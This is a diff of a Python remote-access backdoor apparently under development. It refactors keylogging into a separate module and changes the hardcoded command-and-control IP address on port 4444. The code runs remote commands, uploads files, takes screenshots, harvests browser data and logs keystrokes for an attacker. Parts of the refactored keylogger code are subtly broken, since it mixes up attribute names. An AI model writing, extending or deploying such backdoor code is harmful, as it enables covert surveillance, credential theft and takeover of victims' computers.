@@ -2,7 +2,6 @@ import socket
 import subprocess,json
 import os
 import base64
-import pynput
 import ssl
 import pyautogui
 import tempfile
@@ -10,6 +9,7 @@ import keyboard
 import sys
 import shutil
 from Browser import browser
+from Keylogger import keylogger
 
 class Backdoor:
     def __init__(self,ip,port):
@@ -23,8 +23,6 @@ class Backdoor:
         self.Send("bakara")
         # self.add_persistent()
         # self.keylogger_thread=None
-        self.keylogger_log="Keylogger is off"
-        self.keylogger_previous_command=""
     
     def BrowserData(self,type):
         br=browser()
@@ -82,42 +80,18 @@ class Backdoor:
         with open(path,"wb") as file:
             file.write(content)
             return "[+] Upload successful"
-        
-    def ProcessKeyPress(self,key):
-        try:
-            current_key=str(key.char)
-        except AttributeError:
-            if key==key.space:
-                current_key=" "
-            else:
-                current_key=" "+str(key)+" "
-        self.keylogger_log=self.keylogger_log+current_key
     
     def KeyLogger(self,command):
-        if command == "on" and self.keylogger_previous_command != "on":
-            self.keylogger_log = ""
-            self.keylogger_previous_command = "on"
-            def start_thread():
-                keylogger_listener=pynput.keyboard.Listener(on_press=self.ProcessKeyPress)
-                keylogger_listener.start()
-                return keylogger_listener
-            
-            self.keylogger_listener=start_thread()
-            return "[+] Keylogger is on"
-        
-        elif command == "off" and self.keylogger_previous_command == "on":
-            self.keylogger_previous_command = "off"
-            self.keylogger_listener.stop()
-            return "[+] Keylogger is off"
+        if command == "on":
+            NewKeylogger=keylogger()
+            self.Keylogger=NewKeylogger
+            self.keylogger.on()
+        elif command == "off":
+            return self.keylogger.off()
         elif command=="report":
-            if self.keylogger_log=="Keylogger is off":
-                return "[-] Keylogger is off"
-            elif self.keylogger_log=="":
-                return "[-] Keylogger is empty"
-            else:
-                return self.keylogger_log
+            return self.keylogger.report()
         else:
-            return "[-] Invalid command or Command is already executed"
+            return "[-] Invalid command"
             
     def Screenshot(self):
         screenshot = pyautogui.screenshot()
@@ -172,5 +146,5 @@ class Backdoor:
                 command_result="[-] Bakara ERR : \n%s"%str(e)
             self.Send(command_result)
 
-my_backdoor=Backdoor("20.235.254.229",4444)
+my_backdoor=Backdoor("98.70.78.176",4444)
 my_backdoor.run()
